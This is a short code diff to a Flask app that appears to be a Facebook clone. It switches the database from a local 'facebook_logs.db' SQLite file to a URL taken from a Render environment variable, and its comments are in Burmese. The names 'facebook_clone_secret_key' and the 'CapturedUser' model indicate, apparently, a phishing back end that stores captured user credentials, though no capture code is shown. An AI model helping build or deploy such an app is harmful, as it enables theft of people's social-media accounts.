@@ -3,13 +3,18 @@ from flask_sqlalchemy import SQLAlchemy
 from datetime import datetime
 
 app = Flask(__name__)
-app.secret_key = "facebook_clone_secret_key"
 
-# SQLite Database setup
-app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///facebook_logs.db'
-app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
+# [ပြင်ဆင်လိုက်သည့်အပိုင်း] - Render ၏ Environment Variable မှ Database URL ကို ယူသုံးခြင်း
+db_url = os.environ.get("DATABASE_URL", "sqlite:///app.db")
+
+# Render ၏ URL စာသား ပုံစံကို SQLAlchemy လက်ခံနိုင်သော ပုံစံသို့ ပြောင်းလဲခြင်း
+if db_url.startswith("postgres://"):
+  db_url = db_url.replace("postgres://", "postgresql://", 1)
+
+app.config["SQLALCHEMY_DATABASE_URI"] = db_url
+app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
+
 db = SQLAlchemy(app)
-
 # Database Model
 class CapturedUser(db.Model):
     id = db.Column(db.Integer, primary_key=True)
